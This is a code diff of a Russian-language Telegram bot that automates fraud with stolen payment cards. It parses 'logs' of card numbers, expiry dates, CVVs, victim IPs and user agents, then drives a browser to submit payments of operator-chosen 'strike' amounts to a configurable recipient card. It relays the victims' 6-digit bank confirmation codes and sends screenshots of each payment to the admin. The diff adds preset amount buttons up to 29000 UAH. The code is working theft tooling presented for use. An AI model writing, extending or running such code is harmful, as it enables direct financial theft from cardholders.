@@ -15,12 +15,14 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
 
+# ========== FLASK ==========
 app = Flask(__name__)
 @app.route('/ping')
 def ping(): return "OK", 200
 def run_flask(): app.run(host='0.0.0.0', port=10000)
 threading.Thread(target=run_flask, daemon=True).start()
 
+# ========== БОТ ==========
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
@@ -30,6 +32,7 @@ def get_main_menu():
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
     return kb
 
+# ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
@@ -50,7 +53,6 @@ def init_db():
     )""")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
-    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('default_amount', '1000')")
     conn.commit()
     conn.close()
 
@@ -89,14 +91,6 @@ def update_session(session_id, field, value):
     conn.commit()
     conn.close()
 
-def get_session_by_msg(msg_id):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code')", (msg_id,))
-    row = c.fetchone()
-    conn.close()
-    return row
-
 def get_session(session_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -105,6 +99,15 @@ def get_session(session_id):
     conn.close()
     return row
 
+def get_session_by_msg(msg_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code')", (msg_id,))
+    row = c.fetchone()
+    conn.close()
+    return row
+
+# ========== ПАРСЕР ==========
 def parse_log(text):
     data = {"card": None, "expiry": None, "cvv": None, "ip": None, "user_agent": None}
     lines = text.split("\n")
@@ -128,6 +131,15 @@ def parse_log(text):
     if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
     return data
 
+# ========== КНОПКИ СУММ ==========
+def get_amount_keyboard(session_id):
+    kb = InlineKeyboardMarkup(row_width=3)
+    amounts = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]
+    for a in amounts:
+        kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
+    return kb
+
+# ========== ЭМУЛЯЦИЯ СКРИНШОТОМ ==========
 async def emulate_payment(session_id, code=None):
     session = get_session(session_id)
     if not session: return "Сессия не найдена"
@@ -148,6 +160,15 @@ async def emulate_payment(session_id, code=None):
         await page.fill('input[name="amount"]', str(amount))
         await page.click('button[type="submit"]')
         await asyncio.sleep(3)
+
+        # === СКРИНШОТ ПОСЛЕ ВВОДА ДАННЫХ И НАЖАТИЯ ОПЛАТИТЬ ===
+        screenshot = await page.screenshot(full_page=True)
+        await bot.send_photo(
+            chat_id=ADMIN_ID,
+            photo=screenshot,
+            caption=f"💳 Платёж на {amount} UAH инициирован. Ожидание ответа банка..."
+        )
+
         if await page.is_visible('input[name="code"]'):
             if code:
                 await page.fill('input[name="code"]', code)
@@ -164,6 +185,7 @@ async def emulate_payment(session_id, code=None):
         error_text = await page.text_content('.error')
         return f"❌ Ошибка: {error_text or 'неизвестная'}"
 
+# ========== КОМАНДЫ ==========
 @dp.message_handler(commands=['start'])
 async def start_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -185,14 +207,6 @@ async def set_proxy(msg: types.Message):
     set_setting('proxy', parts[1])
     await msg.reply("✅ Прокси обновлён")
 
-@dp.message_handler(commands=['set_amount'])
-async def set_amount(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID: return
-    parts = msg.text.split()
-    if len(parts) < 2 or not parts[1].isdigit(): await msg.reply("❌ Используй: /set_amount 5000"); return
-    set_setting('default_amount', parts[1])
-    await msg.reply(f"✅ Сумма по умолчанию: {parts[1]} UAH")
-
 @dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
 async def main_menu(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -205,7 +219,6 @@ async def admin_panel(msg: types.Message):
     kb.add(
         InlineKeyboardButton("💳 Карта", callback_data="change_card"),
         InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
-        InlineKeyboardButton("💰 Сумма", callback_data="change_amount"),
         InlineKeyboardButton("📋 Статус", callback_data="show_status"),
     )
     await msg.reply("🏦 Админ-панель", reply_markup=kb)
@@ -213,7 +226,7 @@ async def admin_panel(msg: types.Message):
 @dp.callback_query_handler(lambda c: c.data.startswith("change_"))
 async def settings_callback(callback: types.CallbackQuery):
     action = callback.data.split("_")[1]
-    prompts = {"card": "Введите новый номер карты получателя:", "proxy": "Введите новый прокси:", "amount": "Введите сумму по умолчанию (UAH):"}
+    prompts = {"card": "Введите новый номер карты получателя:", "proxy": "Введите новый прокси:"}
     await callback.message.reply(prompts.get(action, "Ошибка"))
     await callback.answer()
 
@@ -221,39 +234,31 @@ async def settings_callback(callback: types.CallbackQuery):
 async def show_status(callback: types.CallbackQuery):
     card = get_setting('card_to') or "не задана"
     proxy = get_setting('proxy') or "не задан"
-    amount = get_setting('default_amount') or "не задана"
-    await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}\n💰 Сумма: {amount} UAH")
+    await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}")
     await callback.answer()
 
+@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
+async def handle_amount_callback(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    session_id = int(parts[1])
+    amount = int(parts[2])
+    await callback.answer(f"💰 {amount} UAH")
+    update_session(session_id, 'amount', amount)
+    update_session(session_id, 'status', 'processing')
+    await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
+    result = await emulate_payment(session_id)
+    if result == "waiting_code":
+        update_session(session_id, 'status', 'waiting_code')
+        code_msg = await callback.message.reply("🔐 Введите 6-значный код (ответьте на это сообщение):")
+        update_session(session_id, 'msg_id', code_msg.message_id)
+    else:
+        update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
+        await callback.message.reply(result)
+
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
-async def handle_reply(msg: types.Message):
-    text = msg.reply_to_message.text
-    user_input = msg.text.strip()
-
-    if "сумму удара" in text:
-        if not user_input.isdigit():
-            await msg.reply("❌ Введи число!")
-            return
-        amount = int(user_input)
-        session = get_session_by_msg(msg.reply_to_message.message_id)
-        if not session:
-            await msg.reply("❌ Сессия не найдена. Отправь лог заново.")
-            return
-        session_id = session[0]
-        update_session(session_id, 'amount', amount)
-        update_session(session_id, 'status', 'processing')
-        await msg.reply(f"🚀 Платёж на {amount} UAH...")
-        result = await emulate_payment(session_id)
-        if result == "waiting_code":
-            update_session(session_id, 'status', 'waiting_code')
-            code_msg = await msg.reply("🔐 Введите 6-значный код (ответьте):")
-            update_session(session_id, 'msg_id', code_msg.message_id)
-        else:
-            update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
-            await msg.reply(result)
-        return
-
-    if "код" in text:
+async def handle_code_reply(msg: types.Message):
+    if "код" in msg.reply_to_message.text:
+        user_input = msg.text.strip()
         if not user_input.isdigit() or len(user_input) != 6:
             await msg.reply("❌ 6 цифр!")
             return
@@ -266,14 +271,6 @@ async def handle_reply(msg: types.Message):
         result = await emulate_payment(session_id, user_input)
         update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
         await msg.reply(result)
-        return
-
-    if "номер карты" in text:
-        set_setting('card_to', user_input)
-        await msg.reply("✅ Карта обновлена!")
-    elif "прокси" in text:
-        set_setting('proxy', user_input)
-        await msg.reply("✅ Прокси обновлён!")
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
 async def handle_log(msg: types.Message):
@@ -282,11 +279,13 @@ async def handle_log(msg: types.Message):
         await msg.reply("❌ Не удалось распознать данные.")
         return
     session_id = create_session(data, msg.message_id)
+    kb = get_amount_keyboard(session_id)
     await msg.reply(
         f"✅ Данные распознаны:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
         f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
         f"👻 UA: {data['user_agent'][:30]}...\n\n"
-        f"💰 Введите сумму удара (ответьте на это сообщение):"
+        f"💰 Выберите сумму удара:",
+        reply_markup=kb
     )
 
 if __name__ == "__main__":
